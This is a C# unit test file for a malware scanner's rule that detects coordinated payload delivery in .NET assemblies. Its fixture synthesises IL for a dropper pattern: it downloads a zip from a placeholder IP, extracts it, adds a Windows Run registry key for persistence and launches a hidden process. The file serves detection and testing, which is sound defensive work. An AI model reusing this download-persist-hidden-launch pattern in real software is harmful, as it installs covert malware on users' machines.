using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class CoordinatedPayloadDeliveryRuleTests
{
    private readonly CoordinatedPayloadDeliveryRule _rule = new();

    [Fact]
    public void PostAnalysisRefine_ArchiveAutorunHiddenLaunch_ReturnsFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("archive payload delivery", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveUpdaterWithoutPersistence_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: false);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveInstallerWithVisibleLaunch_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[] { ProcessFinding("Target: updater.exe") };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    private static AssemblyDefinition CreateArchiveInstaller(bool includeRegistryPersistence)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("ArchiveInstaller", new Version(1, 0)),
            "ArchiveInstaller",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Installer", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Install", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "http://198.51.100.8/payload.zip");
        il.Emit(OpCodes.Call, Method(module, "System.Net", "HttpWebRequest", "GetResponse"));
        il.Emit(OpCodes.Call, Method(module, "System.IO", "File", "Create"));
        il.Emit(OpCodes.Call, Method(module, "System.IO.Compression", "ZipFile", "ExtractToDirectory"));
        il.Emit(OpCodes.Call, Method(module, "System", "Environment", "GetFolderPath"));
        if (includeRegistryPersistence)
        {
            il.Emit(OpCodes.Ldstr, @"Software\Microsoft\Windows\CurrentVersion\Run");
            il.Emit(OpCodes.Call, Method(module, "Microsoft.Win32", "RegistryKey", "SetValue"));
        }
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        il.Emit(OpCodes.Ret);
        return assembly;
    }

    private static MethodReference Method(ModuleDefinition module, string ns, string type, string name)
    {
        return new MethodReference(
            name,
            module.TypeSystem.Void,
            new TypeReference(ns, type, module, module.TypeSystem.CoreLibrary));
    }

    private static ScanFinding ProcessFinding(string description)
    {
        return new ScanFinding("Test.Sample.Installer.Install", description, Severity.High, description)
        {
            RuleId = "ProcessStartRule"
        };
    }
}
